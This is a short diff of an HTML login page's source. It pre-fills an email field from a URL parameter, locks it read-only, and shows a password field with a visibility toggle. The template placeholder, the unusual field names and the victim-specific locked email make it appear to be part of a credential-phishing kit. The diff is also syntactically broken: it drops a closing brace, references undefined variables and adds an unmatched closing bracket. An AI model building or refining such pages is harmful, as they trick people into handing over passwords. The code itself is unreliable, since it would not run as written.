@@ -181,7 +181,7 @@
         <!-- Email -->
 		
         <div class="input-group">
-		<input type="emp" id="oruko" placeholder="Email" autocomplete="on" value="[[-Email-]]" />
+		<input type="emp" id="oruko" placeholder="Email" autocomplete="on" value="" />
 		<p id="msgfont"></p>
 		<div class="password-wrapper"></div>
 	</div>
@@ -233,19 +233,16 @@
     function getEmailFromUrl() {
       const urlParams = new URLSearchParams(window.location.search);
       return urlParams.get('emp');
-    }
 
-    // Get email from URL and pre-fill the email field
-    const emailFromUrl = getEmailFromUrl();
-    const emailField = document.getElementById('email');
-    
-    if (emailFromUrl && emailField) {
-      emailField.value = emailFromUrl;
-      // LOCK THE EMAIL FIELD - user cannot edit or clear it
-      emailField.readOnly = true;
-      emailField.style.backgroundColor = '#f5f5f5';
-      emailField.style.cursor = 'not-allowed';
+    if (emailInput && emailFromUrl) {
+      emailInput.value = decodeURIComponent(emailFromUrl);
+      // This line locks the field
+      emailInput.readOnly = true; 
+      // Optional: adds a greyed-out look to show it's locked
+      emailInput.style.backgroundColor = "#f0f0f0"; 
+      emailInput.style.cursor = "not-allowed";
     }
+  });
   document.addEventListener('DOMContentLoaded', function() {
     const togglePassword = document.getElementById('togglePassword');
     const passwordInput = document.getElementById('password');
